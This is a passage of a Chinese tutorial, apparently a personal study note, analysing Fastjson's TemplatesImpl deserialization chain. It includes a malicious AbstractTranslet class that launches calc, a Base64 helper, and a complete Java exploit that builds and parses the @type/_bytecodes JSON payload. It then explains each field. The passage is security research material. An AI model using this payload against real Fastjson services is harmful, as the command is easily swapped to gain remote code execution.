punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>\n    <span class="token comment">//构造函数</span>\n    <span class="token keyword">public</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">&quot;calc&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token annotation punctuation">@Override</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token annotation punctuation">@Override</span>\n    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span>SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>\n\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>\n        <span class="token class-name">Test1</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到，我们通过以上代码直接定义类 Test1，并在类的构造方法中执行 calc 的命令；至于为什么要写上述代码的 transform，因为 Test 类是继承 <code>AbstractTranslet</code>​ 的，<strong>上述代码的两个 transform 方法都是实现 AbstractTranslet 接口的抽象方法，因此都是需要的。</strong></p><p>​<img src="'+J+'" alt="image" loading="lazy">​</p><p>具体来说的话，第一个 transform 主要的 <code>transform()</code>​ 方法 -- 它被编译器覆盖，第二个 transform 使用给定的输出处理程序调用 <code>transform()</code>​</p><p><strong>总结：</strong> 对于上述代码，应该这么理解：建立 Test1 类，并让其继承 AbstractTranslet 类。然后通过 <code>Test1 t = new Test1()</code>​; 来初始化，在此过程中会触发构造方法，而我在构造方法中的代码就是执行 calc，所以会弹出计算器。</p><h3 id="classtobase64" tabindex="-1"><a class="header-anchor" href="#classtobase64"><span>ClassToBase64</span></a></h3><p>不知道为什么 IDEA 编译出来的可以运行，但是命令行会提示，错误: 找不到或无法加载主类 util.ClassToBase64 。</p><p>​<img src="'+O+'" alt="image" loading="lazy">​</p><p>单独写个文件编译运行。</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>* 编译：javac <span class="token parameter variable">-encoding</span> UTF-8 <span class="token parameter variable">-d</span> <span class="token builtin class-name">.</span> .<span class="token punctuation">\\</span>ClassToBase64.java\n* 运行：java ClassToBase64\n* Usage: <span class="token function">java</span> ClassToBase64 <span class="token operator">&lt;</span>classFilePath<span class="token operator">&gt;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassToBase64</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            <span class="token comment">// java ClassToBase64 /path/to/your/MyClass.class</span>\n            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">&quot;Usage: java ClassToBase64 &lt;classFilePath&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">return</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n\n        <span class="token class-name">String</span> classFilePath <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n\n        <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token comment">// 读取指定路径下的字节码文件</span>\n            <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>classFilePath<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> fis<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>\n            fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            <span class="token comment">// 将字节码文件转换为 Base64 编码的字符串</span>\n            <span class="token class-name">String</span> base64Encoded <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            <span class="token comment">// 打印 Base64 编码结果</span>\n            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>base64Encoded<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+E+'" alt="image" loading="lazy">​</p><p>好了解决了，就是路径不对。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp\\fatjsondemo\\target\\classes\\util<span class="token operator">&gt;</span> java <span class="token class-name">ClassToBase64</span>\n错误<span class="token operator">:</span> 找不到或无法加载主类 <span class="token class-name">ClassToBase64</span>\n\n<span class="token comment">// -cp 方式在任何路径都能成功执行</span>\n<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp<span class="token operator">&gt;</span> java <span class="token operator">-</span>cp <span class="token string">&quot;D:\\tmp\\fatjsondemo\\target\\classes&quot;</span> <span class="token class-name"><span class="token namespace">util<span class="token punctuation">.</span></span>ClassToBase64</span> <span class="token string">&quot;D:\\tmp\\fatjsondemo\\target\\classes\\poc\\Test1.class&quot;</span>\n\n<span class="token comment">// classes 目录下，带包名成功执行</span>\n<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp\\fatjsondemo\\target\\classes<span class="token operator">&gt;</span> java <span class="token class-name"><span class="token namespace">util<span class="token punctuation">.</span></span>ClassToBase64</span> <span class="token string">&quot;D:\\tmp\\fatjsondemo\\target\\classes\\poc\\Test1.class&quot;</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>【目录结构】</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp\\fatjsondemo<span class="token operator">&gt;</span> tree <span class="token operator">/</span>f\n\n<span class="token constant">PS</span> <span class="token class-name">D</span><span class="token operator">:</span>\\tmp\\fatjsondemo<span class="token operator">&gt;</span> tree\n卷 <span class="token class-name">Data</span> 的文件夹 <span class="token constant">PATH</span> 列表\n卷序列号为 <span class="token constant">DA1D</span><span class="token operator">-</span><span class="token number">0E68</span>\n<span class="token class-name">D</span><span class="token operator">:</span><span class="token punctuation">.</span>\n├─<span class="token punctuation">.</span>idea\n├─src\n│  └─main\n│      ├─java\n│      │  ├─demo\n│      │  ├─poc\n│      │  └─util\n│      ├─resources\n│      └─webapp\n│          └─<span class="token constant">WEB</span><span class="token operator">-</span><span class="token constant">INF</span>\n└─target\n    ├─classes\n    │  ├─demo\n    │  ├─poc\n    │  └─util\n    └─generated<span class="token operator">-</span>sources\n        └─annotations\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="templatesimpl-exploit" tabindex="-1"><a class="header-anchor" href="#templatesimpl-exploit"><span>TemplatesImpl Exploit</span></a></h3><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>\n\n<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo1Exp</span> <span class="token punctuation">{</span>\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>\n\n    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>\n        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Test</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token string">&quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;</span><span class="token punctuation">;</span>\n        cc<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token class-name">String</span> randomClassName <span class="token operator">=</span> <span class="token string">&quot;ref4&quot;</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        cc<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>randomClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>\n        cc<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">(</span>classPool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n        <span class="token keyword">try</span> <span class="token punctuation">{</span>\n            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> evilCode <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">String</span> evilCodeBase64 <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>evilCode<span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">=</span> <span class="token string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="token punctuation">;</span>\n            <span class="token class-name">String</span> text <span class="token operator">=</span> <span class="token string">&quot;{&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;\\&quot;@type\\&quot;:\\&quot;&quot;</span> <span class="token operator">+</span> <span class="token constant">NASTY_CLASS</span> <span class="token operator">+</span> <span class="token string">&quot;\\&quot;,&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;\\&quot;_bytecodes\\&quot;:[\\&quot;&quot;</span> <span class="token operator">+</span> evilCodeBase64 <span class="token operator">+</span> <span class="token string">&quot;\\&quot;],&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;&#39;_name&#39;:&#39;object&#39;,&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;&#39;_tfactory&#39;:{ },&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;_outputProperties:{ }&quot;</span> <span class="token operator">+</span>\n                    <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>\n\n            <span class="token comment">// &quot;\\&quot;_outputProperties\\&quot;:{ }&quot;</span>\n            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>\n\n            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n            <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> config<span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token punctuation">}</span>\n    <span class="token punctuation">}</span>\n<span class="token punctuation">}</span>\n\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+N+'" alt="image" loading="lazy">​</p><h4 id="为什么恶意类需要继承-abstracttranslet-类" tabindex="-1"><a class="header-anchor" href="#为什么恶意类需要继承-abstracttranslet-类"><span>为什么恶意类需要继承 AbstractTranslet 类</span></a></h4><p>TemplatesImpl 利用链中 <code>defineTransletClasses()</code>​ 方法会判断恶意类的父类类名是否是 <code>ABSTRACT_TRANSLET</code>​（），是的话 <code>_transletIndex</code>​ 变量的值被设置为 0，到后面的 if 判断语句中就不会被识别为 <code>&lt;0</code>​ 而抛出异常终止程序。</p><p>​<img src="'+I+'" alt="image" loading="lazy">​</p><h4 id="为什么需要对-bytecodes-进行-base64-编码" tabindex="-1"><a class="header-anchor" href="#为什么需要对-bytecodes-进行-base64-编码"><span>为什么需要对 _bytecodes 进行 Base64 编码</span></a></h4><p>在 poc 中的 <code>_bytecodes</code>​ 字段是经过 Base64 编码的，为什么要怎么做呢？分析 Fastjson 对 JSON 字符串的解析过程，原理 Fastjson 提取 <code>byte[]</code>​ 数组字段值时会进行 Base64 解码，所以我们构造 payload 时需要对 <code>_bytecodes</code>​ 字段进行 Base64 加密处理。</p><p>在 <code>setValue()</code>​ 之前会进行 <code>ObjectArrayCodec.deserialze()</code>​ 函数中 --&gt; 会调用 <code>lexer.bytesValue()</code>​ 对 byte 数组进行处理 --&gt; 跟进 <code>bytesValue()</code>​ 函数，就是对 <code>_bytecodes</code>​ 的内容进行 Base64 解码。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// com.alibaba.fastjson.parser.ParserConfig#getDeserializer</span>\n<span class="token comment">// com.alibaba.fastjson.serializer.ObjectArrayCodec#deserialze</span>\n<span class="token comment">// com.alibaba.fastjson.parser.JSONScanner#bytesValue</span>\n<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">deserialze</span><span class="token punctuation">(</span><span class="token class-name">DefaultJSONParser</span> parser<span class="token punctuation">,</span> <span class="token class-name">Type</span> type<span class="token punctuation">,</span> <span class="token class-name">Object</span> fieldName<span class="token punctuation">)</span> <span class="token punctuation">{</span>\n    <span class="token keyword">final</span> <span class="token class-name">JSONLexer</span> lexer <span class="token operator">=</span> parser<span class="token punctuation">.</span>lexer<span class="token punctuation">;</span>\n    <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">COMMA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n\n    <span class="token keyword">if</span> <span class="token punctuation">(</span>lexer<span class="token punctuation">.</span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">LITERAL_STRING</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> lexer<span class="token punctuation">.</span><span class="token function">bytesValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        lexer<span class="token punctuation">.</span><span class="token function">nextToken</span><span class="token punctuation">(</span><span class="token class-name">JSONToken</span><span class="token punctuation">.</span><span class="token constant">COMMA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> bytes<span class="token punctuation">;</span>\n    <span class="token punctuation">}</span>\n</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>​<img src="'+B+'" alt="image" loading="lazy">​</p><h4 id="为什么需要设置-tfactory-为" tabindex="-1"><a class="header-anchor" href="#为什么需要设置-tfactory-为"><span>为什么需要设置 _tfactory 为 {}</span></a></h4><p>TemplatesImpl 利用链中在 <code>getTransletInstance()</code>​ 函数中调用了 <code>defineTransletClasses()</code>​ 函数是用于生成 Java 类的，在其中会新建一个转换类加载器，其中会调用到 <code>_tfactory.getExternalExtensionsMap()</code>​ 方法，若 <code>_tfactory</code>​ 为 null 则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用。</p><p>主要还是看 Java 版本，java1.8.0_20(1.8u20) 并没有 <code>_tfactory.getExternalExtensionsMap()</code>​ 这个判断。</p><h4 id="为什么反序列化调用-getter-方法时会调用到-templatesimpl-getoutputproperties-方法" tabindex="-1"><a class="header-anchor" href="#为什么反序列化调用-getter-方法时会调用到-templatesimpl-getoutputproperties-方法"><span>为什么反序列化调用 getter 方法时会调用到 TemplatesImpl.getOutputProperties() 方法</span></a></h4><p>getOutputProperties() 方法是个无参数的非静态的 getter 方法，以 get 开头且第四个字母为大写形式，其返回值类型是 Properties 即继承自 Map 类型，满足之前面说的 <a href="%5B%E5%BE%97%E5%87%BA%E4%BB%A5%E4%B8%8B%E7%BB%93%E8%AE%BA%EF%BC%8CFastjson%20%E4%BC%9A%E5%AF%B9%E6%BB%A1%E8%B6%B3%E4%B8%8B%E5%88%97%E8%A6%81%E6%B1%82%E7%9A%84%20setter/getter%20%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%B0%83%E7%94%A8%EF%BC%9A%5D(siyuan://blocks/20240416155849-cy5q1rx)">Fastjson 反序列化时会调用的 getter 方法的条件</a>。</p><p>因此在使用 Fastjson 对 TemplatesImpl 类对象进行反序列化操作时会自动调用 <code>getOutputProperties()</code>​ 方法。</p><h4 id="如何关联-outputproperties-与-getoutputproperties-方法" tabindex="-1"><a class="header-anchor" href="#如何关联-outputproperties-与-getoutputproperties-方法"><span>如何关联 _outputProperties 与 getOutputProperties() 方法</span></a></h4><p>Fastjson 会语义分析 JSON 字符串，根据字段 key，调用 <code>fieldList</code>​ 数组中存储的相应方法进行变量初始化赋值。</p><p>具体的代码在 <code>JavaBeanDeserializer.parseField()</code>​ 中，其中调用了 <code>smartMatch()</code>​ 方法会替换掉字段 key 中的 <code>_</code>​，从而使得 <code>_outputProperties</code>​ 变成了 outputProperties。既然已经得到了 outputProperties 属性了，那么自然而然就会调用到 <code>getOutputProperties()</code>​ 方法了。</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token comment">// 